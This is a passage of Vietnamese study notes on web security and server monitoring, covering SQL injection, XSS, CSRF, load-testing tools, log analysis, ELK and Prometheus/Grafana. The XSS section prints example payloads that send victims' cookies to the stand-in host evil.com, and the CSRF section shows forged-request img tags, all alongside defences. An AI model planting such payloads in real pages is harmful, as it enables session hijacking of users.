- **Thiệt hại kinh tế và uy tín:** Gián đoạn kinh doanh, mất niềm tin từ khách hàng và chi phí khắc phục sự cố thường rất lớn.

#### 4.1.4. Biện Pháp Phòng Chống

**a. Sử dụng Prepared Statements (Câu lệnh tham số hóa)**

Đây là biện pháp hiệu quả nhất. Prepared Statements tách biệt hoàn toàn cấu trúc câu lệnh SQL khỏi dữ liệu đầu vào. Dù dữ liệu có chứa ký tự đặc biệt, chúng sẽ luôn được xử lý là dữ liệu thuần túy, không bao giờ được thực thi như là câu lệnh SQL.

```typescript
// Đúng: Sử dụng tham số hóa
let query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);

// Sai: Nối chuỗi trực tiếp - dễ bị SQL Injection
let query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**b. Sử dụng ORM (Object-Relational Mapping)**

Các ORM như Prisma, Sequelize hoặc TypeORM tự động tạo các câu lệnh SQL được tham số hóa phía sau, giảm đáng kể nguy cơ SQL Injection khi sử dụng đúng cách.

**c. Kiểm Tra Đầu Vào (Input Validation)**

Áp dụng whitelist validation: chỉ chấp nhận các ký tự, định dạng và độ dài phù hợp với yêu cầu nghiệp vụ (ví dụ: trường email chỉ chấp nhận định dạng email hợp lệ). Đây là lớp bảo vệ bổ sung, không thay thế cho Prepared Statements.

**d. Áp Dụng Quyền Tối Thiểu (Least Privilege)**

Tài khoản database mà ứng dụng sử dụng chỉ nên được cấp các quyền thực sự cần thiết (SELECT, INSERT, UPDATE). Không bao giờ dùng tài khoản có quyền quản trị (như `root` hay `sa`) cho kết nối từ ứng dụng. Điều này giới hạn thiệt hại tối đa nếu SQL Injection xảy ra.

**e. Sử Dụng Công Cụ Kiểm Tra**

- **SQLMap:** Công cụ mã nguồn mở tự động hóa quá trình phát hiện và khai thác SQL Injection, dùng trong kiểm thử bảo mật.
- **OWASP ZAP:** Công cụ kiểm thử bảo mật ứng dụng web toàn diện, có khả năng phát hiện nhiều lỗ hổng phổ biến bao gồm SQL Injection.

### 4.2. Cross-Site Scripting (XSS)

#### 4.2.1. Tổng Quan

XSS (Cross-Site Scripting) là lỗ hổng bảo mật cho phép kẻ tấn công chèn và thực thi mã JavaScript độc hại trên trình duyệt của người dùng khác. Khác với SQL Injection nhắm vào cơ sở dữ liệu ở phía server, XSS nhắm vào người dùng cuối, biến trình duyệt của họ thành công cụ chống lại chính họ.

Lỗ hổng phát sinh khi ứng dụng web nhận dữ liệu từ người dùng và hiển thị lại trên trang mà không qua bước xử lý (escape/sanitize) phù hợp. Khi đó, trình duyệt của người dùng khác sẽ thực thi mã độc đó như thể nó là một phần hợp lệ của trang web.

XSS cho phép kẻ tấn công đánh cắp cookie phiên làm việc để chiếm tài khoản, thực hiện các hành động giả mạo thay mặt nạn nhân, ghi lại thao tác bàn phím, thay đổi nội dung trang để thực hiện phishing, hoặc thiết lập kết nối backdoor liên tục đến trình duyệt nạn nhân.

#### 4.2.2. Các Loại XSS

**a. Reflected XSS (XSS phản chiếu)**

Payload XSS được gửi đến server (thường thông qua tham số URL) và được server phản chiếu ngay lập tức trong phản hồi HTML. Khi nạn nhân nhấp vào link độc hại do kẻ tấn công tạo ra, trình duyệt sẽ thực thi mã độc.

Ví dụ: Trang tìm kiếm hiển thị lại từ khóa người dùng nhập vào. Kẻ tấn công tạo và phát tán URL:

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

Nếu ứng dụng không escape dữ liệu đầu vào trước khi đưa vào HTML, thẻ `<script>` sẽ được thực thi trong trình duyệt của bất kỳ ai nhấp vào URL này.

Dấu hiệu nhận biết: payload nằm trong tham số URL hoặc form, mã độc chạy ngay sau khi tải trang và biến mất khi tải lại trang mà không có payload.

<img width="1026" height="662" alt="image" src="https://github.com/user-attachments/assets/11b5da5c-fd92-440c-92e0-82437f373fd7" />

**b. Stored XSS (XSS lưu trữ)**

Payload được lưu vĩnh viễn trên máy chủ (trong cơ sở dữ liệu, file log,...) và được thực thi trong trình duyệt của bất kỳ người dùng nào truy cập trang chứa payload đó. Đây là dạng nguy hiểm nhất vì nó tự động ảnh hưởng đến mọi người dùng mà không cần tương tác thêm từ kẻ tấn công.

Ví dụ: Kẻ tấn công đăng bình luận chứa mã độc trên một diễn đàn:

```html
Bài viết hay!<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

Khi người dùng khác xem bình luận này, script sẽ tự động chạy và gửi cookie của họ đến máy chủ kẻ tấn công.

<img width="1078" height="697" alt="image" src="https://github.com/user-attachments/assets/04d2c83a-bbf9-4e1c-acc1-886dabad1c1f" />

**c. DOM-based XSS**

Xảy ra khi mã JavaScript phía client thao tác không an toàn với DOM, chèn dữ liệu từ nguồn không tin cậy (URL, localStorage,...) trực tiếp vào DOM mà không sanitize. Điểm đặc trưng của loại này là payload không bao giờ được gửi lên server, nên rất khó phát hiện bằng các công cụ quét phía server.

Ví dụ: Đoạn mã JavaScript lấy giá trị từ URL và gán vào `innerHTML`:

```javascript
// URL: https://example.com/#<img src=x onerror=alert(document.cookie)>
document.getElementById("content").innerHTML = location.hash.substring(1);
```

#### 4.2.3. Biện Pháp Phòng Chống

**Dành cho Front-end Developer:**

- Ưu tiên dùng `textContent` hoặc `innerText` thay vì `innerHTML` khi hiển thị dữ liệu từ người dùng. Nếu bắt buộc phải render HTML do người dùng tạo, hãy sử dụng thư viện DOMPurify với cấu hình whitelist chặt chẽ.
- Tận dụng cơ chế escape tự động của các framework hiện đại (React, Vue, Angular). Tránh sử dụng các tính năng bypass như `dangerouslySetInnerHTML` (React) hoặc `v-html` (Vue) trừ khi thực sự cần thiết và đã qua sanitize.
- Không gán trực tiếp dữ liệu từ URL hoặc nguồn bên ngoài vào DOM mà không qua kiểm tra.

**Dành cho Back-end Developer:**

- Thực hiện Output Encoding theo ngữ cảnh: encode ký tự đặc biệt (`<`, `>`, `&`, `"`, `'`) trước khi đưa dữ liệu vào HTML response. Mỗi ngữ cảnh (HTML body, HTML attribute, JavaScript, CSS, URL) cần cách encode khác nhau.
- Cấu hình và gửi Content Security Policy (CSP) header trong mọi phản hồi HTTP để giới hạn nguồn tài nguyên được phép thực thi, ngay cả khi XSS xảy ra.
- Thiết lập cookie với flag `HttpOnly` để ngăn JavaScript truy cập vào cookie phiên đăng nhập, hạn chế thiệt hại từ các cuộc tấn công XSS thành công.

**Dành cho Security Engineer và Tester:**

- Kiểm tra XSS trên tất cả các điểm đầu vào: form, tham số URL, HTTP header, dữ liệu JSON.
- Tích hợp SAST/DAST vào quy trình CI/CD để tự động phát hiện lỗ hổng XSS trong code.
- Kiểm tra tính hiệu quả của CSP và cơ chế sanitize đã triển khai.

### 4.3. Cross-Site Request Forgery (CSRF)

#### 4.3.1. Tổng Quan

CSRF (Cross-Site Request Forgery - Giả mạo yêu cầu liên site), còn được gọi là "session riding" hoặc "XSRF", là kỹ thuật tấn công khai thác sự tin tưởng của ứng dụng web đối với người dùng đã được xác thực. Kẻ tấn công lừa trình duyệt của nạn nhân gửi các yêu cầu HTTP có hại đến ứng dụng web mà nạn nhân đang đăng nhập, thực hiện các hành động trái phép dưới danh nghĩa của nạn nhân mà họ không hay biết.

Các cuộc tấn công CSRF đã có từ những năm 1990. Năm 2008, khoảng 18 triệu người dùng eBay tại Hàn Quốc bị mất thông tin cá nhân, và một số khách hàng ngân hàng tại Mexico bị mất tài khoản - cả hai trường hợp đều có liên quan đến kỹ thuật CSRF.

#### 4.3.2. Kịch Bản Tấn Công

Các ứng dụng web hoạt động theo cơ chế nhận yêu cầu HTTP từ trình duyệt người dùng và thực thi chúng. Nếu người dùng đã đăng nhập (có cookie phiên hợp lệ), mọi yêu cầu HTTP từ trình duyệt của họ đều được xem là hợp lệ, bất kể yêu cầu đó xuất phát từ trang web nào.

Kịch bản minh họa: Người dùng Alice đang đăng nhập vào `www.webapp.com`. Kẻ tấn công Bob đăng một bài viết trên diễn đàn mà Alice đang đọc, chứa thẻ:

```html
<img height="0" width="0" src="http://www.webapp.com/project/1/destroy">
```

Khi trình duyệt của Alice tải trang, nó cố gắng load hình ảnh từ URL trên và tự động gửi yêu cầu HTTP DELETE đến `www.webapp.com`, kèm theo cookie phiên hợp lệ của Alice. Máy chủ xác nhận Alice đã đăng nhập và thực hiện xóa dự án số 1 - mà Alice hoàn toàn không biết.

Kẻ tấn công có thể che giấu URL độc hại bằng cách dùng redirect qua server của mình:

```html
<!-- URL trông có vẻ vô hại -->
<img height="0" width="0" src="http://www.ahackersite.com/abc.jpg"/>
```

Nhưng server `ahackersite.com` được cấu hình để redirect đến URL thực sự độc hại trên `webapp.com`.

Ngoài thẻ `<img>`, kẻ tấn công còn có thể sử dụng các thẻ HTML khác như `<iframe>`, `<link>`, `<script>` hoặc các kỹ thuật tấn công kết hợp với lỗ hổng XSS để thực hiện CSRF tinh vi hơn.

#### 4.3.3. Biện Pháp Phòng Chống

**Phía người dùng:**

- Đăng xuất khỏi các dịch vụ quan trọng (ngân hàng, email, mạng xã hội) ngay sau khi hoàn thành giao dịch.
- Không nhấp vào các đường dẫn nhận qua email hoặc mạng xã hội từ nguồn không đáng tin cậy.
- Không lưu mật khẩu trên trình duyệt ("đăng nhập lần sau") trên các thiết bị dùng chung.
- Khi đang thực hiện giao dịch quan trọng, không truy cập các trang web khác trong cùng phiên trình duyệt.

**Phía server:**

**a. Sử dụng đúng phương thức HTTP**

Áp dụng nguyên tắc thiết kế RESTful: chỉ dùng `GET` cho truy vấn dữ liệu (không gây thay đổi trạng thái hệ thống), dùng `POST`, `PUT`, `PATCH`, `DELETE` cho các thao tác thay đổi dữ liệu. Điều này ngăn các kỹ thuật CSRF đơn giản dựa trên thẻ HTML có thể khai thác yêu cầu GET.

**b. CSRF Token**

Đây là biện pháp phòng chống phổ biến và hiệu quả nhất. Với mỗi phiên đăng nhập và mỗi form, server tạo ra một token ngẫu nhiên, duy nhất và không thể đoán được. Token này được nhúng vào form (thường là hidden field) và phải được gửi kèm theo mỗi yêu cầu thay đổi dữ liệu. Server sẽ xác minh token trước khi thực hiện bất kỳ thao tác nào. Vì kẻ tấn công trên trang web khác không thể đọc được token này (do Same-Origin Policy), chúng không thể giả mạo yêu cầu hợp lệ.

Ví dụ trong Ruby on Rails (được bật mặc định):

```ruby
class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
end
```

**c. CAPTCHA và xác nhận hành động**

Sử dụng CAPTCHA hoặc hộp thoại xác nhận cho các thao tác nhạy cảm (xóa dữ liệu, chuyển tiền). Đây là lớp bảo vệ bổ sung, tuy nhiên có thể bị vượt qua nếu kẻ tấn công kết hợp với lỗ hổng XSS để tự động điền và gửi form.

**d. Cookie với thuộc tính SameSite**

Cấu hình thuộc tính `SameSite=Strict` hoặc `SameSite=Lax` cho cookie phiên. Trình duyệt hiện đại sẽ không gửi cookie này kèm theo các yêu cầu xuất phát từ trang web bên ngoài, ngăn chặn hiệu quả phần lớn các cuộc tấn công CSRF.

**e. Kiểm tra Referer Header**

Kiểm tra header `Referer` trong mỗi yêu cầu để xác nhận yêu cầu xuất phát từ cùng domain. Tuy nhiên, phương pháp này có giới hạn vì Referer có thể bị xóa hoặc giả mạo trong một số tình huống.

**f. Sử dụng subdomain riêng cho trang quản trị**

Cookie không thể chia sẻ giữa các domain khác nhau. Vì vậy, việc đặt trang quản trị tại `admin.site.com` thay vì `site.com/admin` tạo ra một ranh giới bảo mật bổ sung.

**g. Giới hạn theo địa chỉ IP**

Đối với các hệ thống quan trọng, chỉ cho phép truy cập từ danh sách địa chỉ IP đã được phê duyệt trước (ví dụ: IP văn phòng công ty).

# II. HIỆU SUẤT VÀ MONITORING

## 1. Công Cụ Đo Lường Hiệu Suất

### 1.1. Apache Benchmark (ab)

#### 1.1.1. Khái Niệm và Vai Trò

Apache Benchmark (thường gọi tắt là `ab`) là công cụ mã nguồn mở chạy trên giao diện dòng lệnh, được thiết kế để đo lường hiệu năng của máy chủ web thông qua giao thức HTTP/HTTPS. Mặc dù ban đầu được phát triển để kiểm tra riêng Apache HTTP Server, công cụ này hiện có thể kiểm thử bất kỳ loại web server hoặc ứng dụng web nào (Nginx, IIS, Node.js, Python Flask,...).

Vai trò chính của `ab` là giúp kỹ sư hệ thống trả lời câu hỏi cốt lõi: "Máy chủ hiện tại có thể chịu tải được bao nhiêu lượng truy cập đồng thời trước khi bị nghẽn hoặc từ chối dịch vụ?"

Công cụ này được dùng cho các mục đích sau:

- **Kiểm thử tải (Load Testing):** Đánh giá khả năng xử lý của server dưới mức tải dự kiến trong môi trường sản xuất, đảm bảo hệ thống vận hành ổn định khi người dùng thực tế truy cập.
- **Kiểm thử giới hạn (Stress Testing):** Đẩy lượng yêu cầu lên mức cực cao để tìm ra "điểm gãy" (bottleneck) của hệ thống, quan sát cách server phản ứng và phục hồi khi bị quá tải.
- **Đo lường tối ưu hóa (Performance Benchmarking):** Sử dụng làm thước đo so sánh hiệu năng trước và sau khi thay đổi cấu hình (ví dụ: so sánh hiệu năng trước và sau khi triển khai Load Balancer hoặc tinh chỉnh cấu hình Nginx).

#### 1.1.2. Ưu Điểm và Hạn Chế

**Ưu điểm:**

- Gọn nhẹ, tiêu tốn rất ít tài nguyên phần cứng của máy thực hiện test.
- Tích hợp sẵn trong hệ sinh thái Linux qua gói `apache2-utils`, không cần cài đặt phức tạp.
- Cú pháp đơn giản, chỉ cần một dòng lệnh để giả lập hàng nghìn kết nối đồng thời.

**Hạn chế:**

- Chỉ có thể gửi các yêu cầu tĩnh đến một endpoint cố định. Không thể giả lập hành vi người dùng phức tạp như lướt nhiều trang, đăng nhập theo kịch bản, hay thực thi JavaScript.
- Không hỗ trợ tốt việc quản lý cookie/session phức tạp trong các bài test dài hơi so với các công cụ chuyên dụng như JMeter hay K6.

#### 1.1.3. Cài Đặt

`ab` nằm trong gói `apache2-utils`. Cài đặt bằng lệnh:

```bash
sudo apt update
sudo apt install apache2-utils -y
```

Kiểm tra phiên bản sau khi cài đặt:

```bash
ab -V
```

#### 1.1.4. Thực Hiện Kiểm Thử

Cú pháp cơ bản:


Trong đó:
- `-n` (number): Tổng số lượng yêu cầu cần gửi.
- `-c` (concurrency): Số lượng yêu cầu được gửi đồng thời trong mỗi đợt.

**Ví dụ:** Gửi tổng cộng 1000 yêu cầu với 100 yêu cầu chạy đồng thời:

```bash
ab -n 1000 -c 100 http://example.com/
```

> **Lưu ý:** URL bắt buộc phải kết thúc bằng dấu gạch chéo `/` khi kiểm thử thư mục gốc của domain (ví dụ: `http://example.com/` thay vì `http://example.com`).

Chạy thử trên localhost:

```bash
ab -n 100 -c 10 http://127.0.0.1/
```

#### 1.1.5. Đọc Hiểu Kết Quả

Sau khi chạy xong, `ab` in ra bảng thống kê. Các chỉ số quan trọng cần chú ý:

- **Failed requests:** Số lượng yêu cầu bị lỗi. Giá trị lý tưởng là 0. Nếu cao, máy chủ đang bị quá tải hoặc có lỗi cấu hình.
- **Requests per second (RPS):** Số yêu cầu máy chủ xử lý thành công mỗi giây. Đây là chỉ số quan trọng nhất để đánh giá sức chịu tải - giá trị càng cao càng tốt.
- **Time per request (mean):** Thời gian trung bình để xử lý một lượt yêu cầu đồng thời.
- **Time per request (mean, across all concurrent requests):** Thời gian trung bình thực tế cho mỗi yêu cầu đơn lẻ - giá trị càng thấp tốc độ phản hồi càng nhanh.
- **Bảng phân vị cuối:** Ví dụ `90% 250` có nghĩa là 90% yêu cầu được xử lý trong vòng 250 milliseconds. Chỉ số này cho biết trải nghiệm của phần lớn người dùng.

### 1.2. Apache JMeter

#### 1.2.1. Tổng Quan

JMeter là công cụ kiểm thử tải và hiệu năng mã nguồn mở, được viết bằng Java và phát triển bởi Apache Software Foundation. Khác với `ab` chỉ có thể test một endpoint tĩnh, JMeter có khả năng mô phỏng các kịch bản người dùng phức tạp và hỗ trợ nhiều loại giao thức: Web (HTTP/HTTPS), SOAP, JDBC (Database), LDAP, JMS, Mail (SMTP/POP3/IMAP) và nhiều giao thức khác.

JMeter hỗ trợ hai loại kiểm thử chính:

- **Load Testing:** Mô phỏng số lượng người dùng dự kiến truy cập đồng thời, xác minh hệ thống có đáp ứng được yêu cầu hiệu năng trong điều kiện bình thường hay không.
- **Stress Testing:** Tăng dần số người dùng vượt quá giới hạn dự kiến để tìm ra điểm giới hạn tối đa mà hệ thống có thể xử lý trước khi bắt đầu từ chối yêu cầu.

**Đặc điểm nổi bật:**

- Giao diện đồ họa (GUI) trực quan, dễ sử dụng.
- Hỗ trợ đa luồng, có thể tạo hàng nghìn kết nối đồng thời.
- Đa nền tảng: chạy trên Windows, Linux, macOS.
- Khả năng mở rộng cao thông qua hệ thống plugin phong phú.
- Cộng đồng lớn, nhiều tài liệu hướng dẫn.

## 2. Tổng Quan Về Web Server Log

### 2.1. Khái Niệm

Trong quá trình vận hành, máy chủ web (Nginx, Apache,...) tự động ghi lại mọi hoạt động, sự kiện và lỗi phát sinh thành các tệp văn bản gọi là **Log** (nhật ký hệ thống). Phân tích log là kỹ năng cốt lõi của kỹ sư quản trị hệ thống, phục vụ cho việc giám sát lưu lượng truy cập, đánh giá hiệu năng và gỡ lỗi khi hệ thống gặp sự cố.

Trên Ubuntu/Debian, các tệp log mặc định được lưu tập trung tại `/var/log/`.

### 2.2. Phân Loại Log

**A. Access Log (Nhật ký truy cập)**

Ghi lại tất cả các yêu cầu gửi đến máy chủ, bất kể thành công hay thất bại.

- Vị trí mặc định: Nginx: `/var/log/nginx/access.log` | Apache: `/var/log/apache2/access.log`
- Mỗi dòng đại diện cho một yêu cầu, chứa: địa chỉ IP client, thời gian truy cập (timestamp), phương thức HTTP (GET, POST,...), mã trạng thái HTTP trả về (200, 404, 502,...) và thông tin User-Agent (trình duyệt, hệ điều hành hoặc công cụ tạo yêu cầu).

**B. Error Log (Nhật ký lỗi)**

Chỉ ghi lại các cảnh báo, lỗi nội bộ và các yêu cầu không thể thực thi do cấu hình sai hoặc thiếu tài nguyên.

- Vị trí mặc định: Nginx: `/var/log/nginx/error.log` | Apache: `/var/log/apache2/error.log`
- Đây là tệp đầu tiên cần kiểm tra khi dịch vụ web không thể khởi động (`systemctl status` báo failed) hoặc khi người dùng liên tục gặp lỗi 5xx. Các nguyên nhân phổ biến được ghi nhận tại đây: hết bộ nhớ (Out of Memory), từ chối kết nối (Connection Refused), lỗi cú pháp trong file cấu hình.

### 2.3. Các Lệnh Phân Tích Log

Không nên mở file log lớn bằng trình soạn thảo văn bản thông thường vì sẽ làm treo hệ thống. Thay vào đó, sử dụng các lệnh CLI chuyên dụng sau:

**Lệnh `tail` - Đọc phần cuối file và giám sát thời gian thực**

```bash
# Xem 50 dòng mới nhất
tail -n 50 /var/log/nginx/error.log

# Giám sát log liên tục theo thời gian thực
tail -f /var/log/apache2/access.log
```

<img width="1647" height="474" alt="image" src="https://github.com/user-attachments/assets/b218dbfb-90cb-4804-b279-d0bd89db689d" />

Lệnh `tail -f` đặc biệt hữu ích khi kết hợp với chạy JMeter ở cửa sổ khác để quan sát từng luồng yêu cầu đổ vào server theo thời gian thực.

<img width="1555" height="248" alt="image" src="https://github.com/user-attachments/assets/3d71f93a-f963-4f0a-af6e-1dd4c9c5dcef" />

**Lệnh `grep` - Tìm kiếm và lọc dữ liệu**

```bash
# Lọc tất cả yêu cầu gặp lỗi 500
grep " 500 " /var/log/nginx/access.log

# Lọc các truy cập từ công cụ JMeter
grep "Apache-HttpClient" /var/log/apache2/access.log
```

**Lệnh `cat` và `less` - Xem toàn bộ file**

```bash
# In toàn bộ nội dung (chỉ dùng với file nhỏ)
cat /var/log/nginx/error.log

# Đọc file lớn với khả năng cuộn trang (nhấn q để thoát)
less /var/log/apache2/access.log
```

### 2.4. Ứng Dụng Trong Load Testing

Khi kiểm thử chịu tải bằng Apache Benchmark hoặc JMeter, kết quả từ công cụ test chưa phản ánh đủ bức tranh toàn cảnh. Kết hợp đọc log trên máy chủ giúp kỹ sư:

1. **Xác minh tính xác thực:** Đảm bảo các luồng yêu cầu giả lập thực sự đã đến được web server, chứ không bị chặn bởi tường lửa hoặc proxy.
2. **Xác định chính xác bottleneck:** Khi tỷ lệ lỗi tăng cao, Access Log xác định thời điểm máy chủ bắt đầu từ chối yêu cầu, còn Error Log cung cấp lý do chi tiết (thiếu worker process, thiếu RAM, tràn bảng kết nối của tường lửa,...).

## 3. Công Cụ Phân Tích và Giám Sát

### 3.1. ELK Stack

**ELK Stack** là bộ ba công cụ mã nguồn mở được kết hợp với nhau để tạo thành một nền tảng phân tích và quản lý log tập trung:

- **Elasticsearch:** Cơ sở dữ liệu NoSQL với khả năng tìm kiếm toàn văn bản (Full-Text Search) mạnh mẽ. Đóng vai trò là kho lưu trữ và công cụ phân tích log.
- **Logstash:** Công cụ thu thập, xử lý và chuyển đổi log viết bằng Java. Nhiệm vụ chính là đọc log từ nhiều nguồn, parse (phân tích cú pháp), làm giàu dữ liệu (thêm thông tin như địa chỉ IP, timestamp chuẩn hóa,...) rồi đưa vào Elasticsearch. Mỗi bản ghi log được lưu dưới dạng JSON.
- **Kibana:** Giao diện web cho phép trực quan hóa dữ liệu từ Elasticsearch thành biểu đồ, dashboard tương tác để phân tích log dễ dàng.

<img width="737" height="742" alt="image" src="https://github.com/user-attachments/assets/9cbe0dde-2164-42d8-b555-3b95e4e33e29" />

**Luồng hoạt động:**

1. Log từ các server được đưa đến Logstash (qua nhiều phương thức: UDP, Beats agent đọc file log,...).
2. Logstash parse dữ liệu, thêm thông tin bổ sung rồi ghi vào Elasticsearch.
3. Người dùng truy cập Kibana qua trình duyệt, Kibana truy vấn Elasticsearch và hiển thị kết quả.

<img width="732" height="284" alt="image" src="https://github.com/user-attachments/assets/9d38fbd4-3110-453d-a595-2a2f7f6773b6" />

**Lý do sử dụng ELK Stack:**

Đối với hệ thống nhỏ, ghi log ra file hoặc stdout là đủ. Tuy nhiên, với hệ thống lớn gồm nhiều dịch vụ phân tán, ELK Stack cung cấp những lợi thế quan trọng:

- **Quản lý log tập trung:** Thay vì phải SSH vào từng máy chủ để xem log, tất cả log từ mọi server đều có thể xem tại một giao diện Kibana duy nhất.
- **Dễ tích hợp:** Logstash hỗ trợ hầu hết các loại log phổ biến (Nginx, Apache, MySQL, Redis,...) mà không cần tùy chỉnh phức tạp.
- **Tìm kiếm mạnh mẽ:** Elasticsearch hỗ trợ Full-Text Search và các truy vấn phức tạp ngay cả trên dữ liệu log có kích thước hàng Terabyte.
- **Khả năng mở rộng:** Khi cần xử lý nhiều log hơn, chỉ cần thêm node vào cluster Elasticsearch hoặc Logstash.
- **Miễn phí và mã nguồn mở:** Không tốn chi phí bản quyền.

### 3.2. Prometheus và Grafana

#### 3.2.1. Grafana

Grafana là ứng dụng web mã nguồn mở chuyên về phân tích và trực quan hóa dữ liệu giám sát. Grafana hỗ trợ kết nối đến nhiều nguồn dữ liệu khác nhau (Prometheus, InfluxDB, Elasticsearch, MySQL,...) và tạo ra các dashboard tương tác với biểu đồ phong phú.

Grafana được sử dụng để:
- Tạo dashboard tương tác hiển thị trạng thái hệ thống theo thời gian thực.
- Giám sát nhiều nguồn dữ liệu cùng lúc, bao gồm cơ sở hạ tầng Kubernetes.
- Phân tích hiệu năng hệ thống theo chiều sâu thông qua các truy vấn tùy chỉnh.
- Thiết lập cảnh báo tự động (alerting) khi các chỉ số vượt ngưỡng đã định, thông báo qua email, Slack hoặc PagerDuty.

**Cài đặt Grafana trên Ubuntu 22.04:**

**Bước 1: Cập nhật hệ thống**

#### 3.2.2. Prometheus

Prometheus là hệ thống giám sát và cảnh báo mã nguồn mở, đặc biệt phù hợp cho các hệ thống phân tán và môi trường Cloud Native. Điểm khác biệt quan trọng của Prometheus so với các hệ thống giám sát truyền thống là mô hình **Pull-based**: Prometheus chủ động đến thu thập (scrape) dữ liệu metrics từ các đối tượng giám sát thông qua HTTP endpoint, thay vì chờ đối tượng chủ động gửi dữ liệu đến.

Dữ liệu được lưu trữ dưới dạng **Time-series** (chuỗi thời gian) trong cơ sở dữ liệu tích hợp (TSDB). Prometheus cung cấp ngôn ngữ truy vấn riêng **PromQL** linh hoạt để phân tích dữ liệu và thiết lập các quy tắc cảnh báo tự động.

## 4. So Sánh Web Server và Application Server

Đây là một câu hỏi thường gặp trong thiết kế hệ thống. Sự phân biệt giữa hai loại này ảnh hưởng trực tiếp đến kiến trúc triển khai.

### Web Server

Web Server (như Nginx, Apache) được thiết kế tối ưu để phục vụ các tài nguyên tĩnh: file HTML, CSS, JavaScript, hình ảnh, video, file PDF. Nó hoạt động theo mô hình đơn giản: nhận yêu cầu HTTP, tìm file tương ứng trên đĩa và trả về cho client. Web server xử lý hàng nghìn kết nối đồng thời rất hiệu quả vì không cần thực hiện tính toán phức tạp.

Web server cũng đảm nhận các vai trò quan trọng khác trong kiến trúc hệ thống như: Reverse Proxy (chuyển tiếp yêu cầu đến application server phía sau), Load Balancer (phân phối tải giữa nhiều server), SSL Termination (xử lý mã hóa/giải mã HTTPS), và Static Cache (lưu cache nội dung tĩnh).

**Nên sử dụng web server thuần túy khi:** Trang web chỉ có nội dung tĩnh (landing page, tài liệu, blog tĩnh được build trước), hoặc khi cần một lớp reverse proxy/cache phía trước application server.

### Application Server

Application Server (như Node.js, Tomcat, Gunicorn cho Python, PHP-FPM) được thiết kế để xử lý logic nghiệp vụ động: truy vấn cơ sở dữ liệu, xác thực người dùng, tính toán, gọi API bên ngoài, tạo nội dung HTML động dựa trên dữ liệu thời gian thực.

Application server hiểu ngôn ngữ lập trình cụ thể và môi trường thực thi tương ứng. Ví dụ: Tomcat thực thi Java Servlet và JSP, Node.js chạy mã JavaScript phía server, Gunicorn/uWSGI chạy ứng dụng Python WSGI.

**Nên sử dụng application server khi:** Ứng dụng cần xử lý đăng nhập, quản lý phiên, tương tác cơ sở dữ liệu, tạo nội dung động, hoặc bất kỳ logic nghiệp vụ nào cần tính toán phía server.

### Kiến Trúc Kết Hợp (Phổ Biến Nhất)

Trong thực tế, hầu hết các hệ thống web hiện đại sử dụng **cả hai** theo mô hình phân lớp:

```
Client (Trình duyệt)
       ↓
  Nginx (Web Server)          ← Phục vụ file tĩnh trực tiếp
       ↓                      ← Reverse proxy cho nội dung động
  Node.js / Tomcat (App Server) ← Xử lý logic nghiệp vụ
       ↓
  MySQL / PostgreSQL (Database)
```

Nginx đứng phía trước, xử lý tất cả các yêu cầu đến. Các yêu cầu cho file tĩnh (CSS, JS, hình ảnh) được Nginx phục vụ trực tiếp từ đĩa mà không cần chuyển tiếp đến application server, giảm tải đáng kể. Chỉ các yêu cầu cần xử lý động mới được Nginx chuyển tiếp đến application server phía sau.

Cách tiếp cận này kết hợp thế mạnh của cả hai: hiệu năng phục vụ file tĩnh tối ưu của web server và khả năng xử lý logic nghiệp vụ của application server.
